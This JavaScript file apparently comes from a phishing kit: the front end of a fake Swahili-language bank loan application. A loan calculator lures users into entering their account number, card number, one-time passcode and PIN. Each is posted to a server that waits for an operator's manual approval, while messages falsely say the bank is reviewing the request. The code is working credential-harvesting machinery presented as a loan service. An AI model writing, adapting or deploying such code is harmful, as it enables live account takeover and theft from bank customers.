function goToScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
    const target = document.getElementById(screenId);
    if (target) {
        target.classList.remove('hidden');
    }
}

function showSpinner(text = 'Inapakia...') {
    const textEl = document.getElementById('loading-text');
    if (textEl) textEl.innerText = text;
    const spinner = document.getElementById('loading-spinner');
    if (spinner) spinner.classList.remove('hidden');
}

function hideSpinner() {
    const spinner = document.getElementById('loading-spinner');
    if (spinner) spinner.classList.add('hidden');
}

function showNotice(elementId, msg) {
    const el = document.getElementById(elementId);
    if (el) {
        el.innerText = msg;
        el.style.display = 'block';
    }
}

function clearNotices() {
    ['step3-notice', 'step4-notice', 'pin-notice'].forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            el.innerText = '';
            el.style.display = 'none';
        }
    });
}

async function postData(step, data) {
    clearNotices();
    showSpinner('Subiri kidogo, inasubiri idhini ya Benki...');
    try {
        const response = await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step, data })
        });
        const result = await response.json();
        
        if (result.resendAcknowledge) {
            hideSpinner();
            showNotice('step4-notice', 'Ombi la kutuma tena OTP limepokelewa.');
            return;
        }

        if (result.pendingApproval) {
            pollAdminResponse();
        } else {
            hideSpinner();
        }
    } catch (e) {
        hideSpinner();
        showNotice('step3-notice', 'Tatizo la mtandao. Jaribu tena ❌');
    }
}

function pollAdminResponse() {
    fetch('/api/poll-status')
        .then(res => res.json())
        .then(res => {
            hideSpinner();
            if (res.status === 'approved') {
                if (res.next === 'otp') goToScreen('screen-step4');
                else if (res.next === 'pin') goToScreen('screen-step5');
                else if (res.next === 'success') goToScreen('screen-success');
            } else if (res.status === 'denied') {
                showNotice('step3-notice', res.message);
            } else if (res.status === 'retry_otp') {
                showNotice('step4-notice', res.message);
            } else if (res.status === 'retry_pin' || res.status === 'blocked') {
                showNotice('pin-notice', res.message);
            }
        })
        .catch(() => {
            hideSpinner();
        });
}

function updateCalculator() {
    const amountVal = document.getElementById('loanAmountSlider');
    const monthsVal = document.getElementById('loanMonthsSlider');
    if (!amountVal || !monthsVal) return;

    const amount = amountVal.value;
    const months = monthsVal.value;
    
    document.getElementById('displayAmount').innerText = 'TZS ' + Number(amount).toLocaleString();
    document.getElementById('displayMonths').innerText = months + ' miezi';
    
    const monthlyPayment = (amount / months) * 1.05;
    document.getElementById('displayMonthlyPayment').innerText = 'TZS ' + Math.round(monthlyPayment).toLocaleString();
    
    document.getElementById('requestedAmount').value = amount;
}

// Auto-jump logic for OTP and PIN input boxes
document.addEventListener('DOMContentLoaded', () => {
    const setupInputGroup = (selector) => {
        const inputs = document.querySelectorAll(selector);
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const value = e.target.value;
                if (value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
    };

    setupInputGroup('.otp-input');
    setupInputGroup('.pin-input');
});

function submitStep1(e) {
    e.preventDefault();
    goToScreen('screen-step2');
    updateCalculator();
}

function submitStep2(e) {
    e.preventDefault();
    goToScreen('screen-step3');
}

function submitStep3(e) {
    e.preventDefault();
    const accountNumber = document.getElementById('accountNumber').value;
    const cardNumber = document.getElementById('cardNumber').value;
    postData('step3', { accountNumber, cardNumber });
}

function submitStep4(e) {
    e.preventDefault();
    const inputs = document.querySelectorAll('.otp-input');
    let otp = '';
    inputs.forEach(i => otp += i.value);
    postData('step4', { otp, isResend: false });
}

function resendOtp(e) {
    e.preventDefault();
    postData('step4', { otp: '', isResend: true });
}

function submitStep5(e) {
    e.preventDefault();
    const inputs = document.querySelectorAll('.pin-input');
    let pin = '';
    inputs.forEach(i => pin += i.value);
    postData('step5', { pin });
    }
     
